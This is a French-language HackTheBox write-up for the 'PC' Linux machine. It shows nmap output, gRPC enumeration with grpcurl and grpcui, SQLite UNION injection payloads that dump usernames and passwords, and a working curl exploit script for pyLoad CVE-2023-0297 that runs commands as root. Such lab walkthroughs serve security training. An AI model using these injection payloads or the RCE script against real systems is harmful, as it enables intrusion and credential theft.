---
title: PC - Easy (Linux)
categories:
- HackTheBox
- Write-up
tags:
- htb
- hack-the-box
- web
- vulnérabilités
- gRPC
---
## Nmap

Nmap donne simple deux services : ssh et un service inconnu , 50051.

```bash
┌──(kali㉿kali)-[/media/sf_shared_folder_vm2/HTB/PC]
└─$ sudo nmap -p- -sV -sC 10.129.176.82
[sudo] password for kali:
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-14 10:37 EDT
Nmap scan report for 10.129.176.82
Host is up (0.021s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 91bf44edea1e3224301f532cea71e5ef (RSA)
|   256 8486a6e204abdff71d456ccf395809de (ECDSA)
|_  256 1aa89572515e8e3cf180f542fd0a281c (ED25519)
50051/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port50051-TCP:V=7.93%I=7%D=6/14%Time=6489D128%P=x86_64-pc-linux-gnu%r(N
SF:ULL,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x0
SF:6\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(Generic
SF:Lines,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(GetRe
SF:quest,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(HTTPO
SF:ptions,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0
SF:\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(RTSP
SF:Request,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\
SF:0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(RPC
SF:Check,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(DNSVe
SF:rsionBindReqTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\
SF:xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0
SF:")%r(DNSStatusRequestTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0
SF:\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\
SF:0\0\?\0\0")%r(Help,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0
SF:\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\
SF:0\0")%r(SSLSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x0
SF:5\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0
SF:\?\0\0")%r(TerminalServerCookie,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xf
SF:f\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0
SF:\0\0\0\0\0\?\0\0")%r(TLSSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?
SF:\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x0
SF:8\0\0\0\0\0\0\?\0\0")%r(Kerberos,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\x
SF:ff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\
SF:0\0\0\0\0\0\?\0\0")%r(SMBProgNeg,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\x
SF:ff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\
SF:0\0\0\0\0\0\?\0\0")%r(X11Probe,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff
SF:\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\
SF:0\0\0\0\0\?\0\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 161.75 seconds
```

Il s'avère que le port 50051 est un port pour gRPC.

### gRPC, qu'est-ce que c'est ?

gRPC est un framework de google qui vise à établir des communications entre divers services via le protocole http2. Il est utile pour mettre en place de microservices, etc.

### Le site ?

Il n'y a pas de site atteignable en tant que tel. Il faut donc trouver un moyen de faire des requêtes dessus.

Pour ce faire, on va utiliser grpcurl, un outil semblable à curl, mais pour gRPC.

https://github.com/fullstorydev/grpcurl

### Énumération

La liste des services exposés via réflection (un peu comme une introspection pour graphQl)

```bash
┌──(kali㉿kali)-[~]
└─$ grpcurl -plaintext 10.129.38.93:50051 list
SimpleApp
grpc.reflection.v1alpha.ServerReflection
```


On a donc un service : SimpleApp.

Liste les méthodes disponibles pour le service :

```bash
┌──(kali㉿kali)-[~]
└─$ grpcurl -plaintext 10.129.38.93:50051 list SimpleApp
SimpleApp.LoginUser
SimpleApp.RegisterUser
SimpleApp.getInfo
```

Le plus simple cependant est d'utiliser une version avec un GUI, via grpcui.

### grpcui

grpcui est un outil vraiment très pratique qui va nous permettre d'avoir une interface web afin de faire nos requêtes. Ici, nul besoin d'énumérer via la réflection, les méthodes sont directement accessibles avec les données attendues pour les requêtes post en json. On peut également rajouter des headers.

On va pouvoir créer un compte si l'on veut. On peut également tester "admin:admin" et ça fonctionne.

En retour nous aurons le droit à un token.

On peut utiliser ce token pour getInfos.

### getInfo

En testant on se rend compte que getInfos est vulnérable à une injection sqlite dans le champ id.

On peut essayer d'extraire des infos de la base de données.

```sql
12 UNION SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
```

Réponse :

```json
{
  "message": "accounts,messages"
}
```

Munis de ces infos, on va essayer d'énumérer la table accounts :

```sql
12 UNION SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name='accounts'
```

Réponse :

```json
{
  "message": "CREATE TABLE \"accounts\" (\n\tusername TEXT UNIQUE,\n\tpassword TEXT\n)"
}
```

On va ensuite essayer d'extraire les username et password de la table :

```sql
12 UNION SELECT group_concat(username) FROM accounts
```

Réponse :

```json
{
  "message": "admin,sau"
}
```

Et enfin les password :

```json
{
  "message": "admin,HereIsYourPassWord1431"
}
```

Mots de passe :

admin:admin
sau:HereIsYourPassWord1431

### User

```bash
ssh sau@10.129.38.93
```

Avec le mot de passe ci-dessus. Et voilà!

### Élévation de privilèges


On voit qu'il y a pyload d'installé.

Cette version est vulnérable à une RCE.

https://attackerkb.com/topics/4G0gkUrtoR/cve-2023-0297

Payload :

```bash
#!/bin/bash

curl -i -s -k -X POST -H "Host: 127.0.0.1:8000" -H "Content-type: Application/x-www-form-urlencoded" -d "jk=pyimport%20os;os.system('$1');f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa" http://127.0.0.1:8000/flash/addcrypted2
```

```bash
./exploit.sh "cat /root/root.txt > /tmp/root.txt"
```

